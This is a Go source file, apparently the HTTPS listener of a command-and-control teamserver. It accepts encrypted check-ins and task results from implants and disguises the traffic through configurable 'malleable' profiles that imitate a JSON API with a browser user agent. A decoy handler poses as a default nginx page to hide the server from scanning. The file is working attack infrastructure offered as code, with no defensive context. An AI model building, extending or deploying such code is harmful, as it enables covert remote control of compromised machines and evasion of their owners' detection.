package listener

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"

	"github.com/darknexus/teamserver/internal/crypto"
	"github.com/darknexus/teamserver/internal/db"
	"github.com/darknexus/teamserver/internal/events"
	"github.com/darknexus/teamserver/internal/implant"
	"github.com/google/uuid"
)

// HTTPSListener handles implant HTTPS communications
type HTTPSListener struct {
	ID       string
	Name     string
	BindAddr string
	Port     int
	Profile  *C2Profile
	Registry *implant.Registry
	Database *db.Database
	PresharedKey []byte

	server   *http.Server
	running  bool
	mu       sync.Mutex
}

// C2Profile defines how HTTP traffic looks (malleable profiles)
type C2Profile struct {
	Name          string            `yaml:"name" json:"name"`
	CheckinURI    string            `yaml:"checkin_uri" json:"checkin_uri"`
	TaskResultURI string            `yaml:"task_result_uri" json:"task_result_uri"`
	UserAgent     string            `yaml:"user_agent" json:"user_agent"`
	Headers       map[string]string `yaml:"headers" json:"headers"`
}

// DefaultProfile returns a basic C2 profile
func DefaultProfile() *C2Profile {
	return &C2Profile{
		Name:          "default",
		CheckinURI:    "/api/v1/status",
		TaskResultURI: "/api/v1/report",
		UserAgent:     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		Headers: map[string]string{
			"Content-Type": "application/json",
			"Accept":       "application/json",
		},
	}
}

func NewHTTPSListener(name, bindAddr string, port int, profile *C2Profile, reg *implant.Registry, database *db.Database, psk []byte) *HTTPSListener {
	if profile == nil {
		profile = DefaultProfile()
	}
	return &HTTPSListener{
		ID:           uuid.New().String(),
		Name:         name,
		BindAddr:     bindAddr,
		Port:         port,
		Profile:      profile,
		Registry:     reg,
		Database:     database,
		PresharedKey: psk,
	}
}

// Start begins listening for implant connections
func (l *HTTPSListener) Start() error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if l.running {
		return fmt.Errorf("listener already running")
	}

	mux := http.NewServeMux()
	mux.HandleFunc(l.Profile.CheckinURI, l.handleCheckin)
	mux.HandleFunc(l.Profile.TaskResultURI, l.handleTaskResult)
	mux.HandleFunc("/", l.handleDefault)

	addr := fmt.Sprintf("%s:%d", l.BindAddr, l.Port)

	tlsCert, err := GenerateSelfSignedTLS()
	if err != nil {
		return fmt.Errorf("TLS cert generation failed: %w", err)
	}

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{tlsCert},
		MinVersion:   tls.VersionTLS12,
	}

	l.server = &http.Server{
		Addr:      addr,
		Handler:   mux,
		TLSConfig: tlsConfig,
	}

	ln, err := tls.Listen("tcp", addr, tlsConfig)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %w", addr, err)
	}
	l.running = true

	l.Database.SaveListener(&db.Listener{
		ID: l.ID, Name: l.Name, Type: "https",
		BindAddr: l.BindAddr, Port: l.Port,
		Status: "running", Profile: l.Profile.Name,
	})

	log.Printf("[listener] HTTPS listener '%s' started on %s", l.Name, addr)
	events.Emit(events.EventListenerStarted, map[string]interface{}{
		"id": l.ID, "name": l.Name, "type": "https", "addr": addr,
	})

	go func() {
		if err := l.server.Serve(ln); err != nil && err != http.ErrServerClosed {
			log.Printf("[listener] HTTPS listener error: %v", err)
		}
	}()

	return nil
}

// Stop shuts down the listener
func (l *HTTPSListener) Stop() error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if !l.running {
		return fmt.Errorf("listener not running")
	}

	if err := l.server.Close(); err != nil {
		return err
	}

	l.running = false
	l.Database.SaveListener(&db.Listener{
		ID: l.ID, Name: l.Name, Type: "https",
		BindAddr: l.BindAddr, Port: l.Port,
		Status: "stopped", Profile: l.Profile.Name,
	})

	log.Printf("[listener] HTTPS listener '%s' stopped", l.Name)
	events.Emit(events.EventListenerStopped, map[string]interface{}{"id": l.ID, "name": l.Name})
	return nil
}

func (l *HTTPSListener) handleCheckin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		l.handleDefault(w, r)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	plaintext, err := crypto.Decrypt(l.PresharedKey, body)
	if err != nil {
		plaintext = body
	}

	var checkin implant.CheckinRequest
	if err := json.Unmarshal(plaintext, &checkin); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	externalIP := extractIP(r)

	resp, err := l.Registry.HandleCheckin(&checkin, externalIP)
	if err != nil {
		log.Printf("[listener] checkin error: %v", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	respJSON, _ := json.Marshal(resp)

	encrypted, err := crypto.Encrypt(l.PresharedKey, respJSON)
	if err != nil {
		log.Printf("[listener] encrypt error: %v", err)
		w.Write(respJSON)
		return
	}

	for k, v := range l.Profile.Headers {
		w.Header().Set(k, v)
	}
	w.WriteHeader(http.StatusOK)
	w.Write(encrypted)
}

func (l *HTTPSListener) handleTaskResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		l.handleDefault(w, r)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 10<<20))
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	plaintext, err := crypto.Decrypt(l.PresharedKey, body)
	if err != nil {
		plaintext = body
	}

	var results []implant.TaskResult
	if err := json.Unmarshal(plaintext, &results); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	if err := l.Registry.HandleTaskResult(results); err != nil {
		log.Printf("[listener] task result error: %v", err)
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"status":"ok"}`))
}

func (l *HTTPSListener) handleDefault(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	w.Header().Set("Server", "nginx/1.24.0")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>It works!</h1><p>The server is running.</p></body></html>`))
}

func extractIP(r *http.Request) string {
	xff := r.Header.Get("X-Forwarded-For")
	if xff != "" {
		parts := strings.SplitN(xff, ",", 2)
		return strings.TrimSpace(parts[0])
	}
	xri := r.Header.Get("X-Real-IP")
	if xri != "" {
		return xri
	}
	host, _, _ := net.SplitHostPort(r.RemoteAddr)
	return host
}
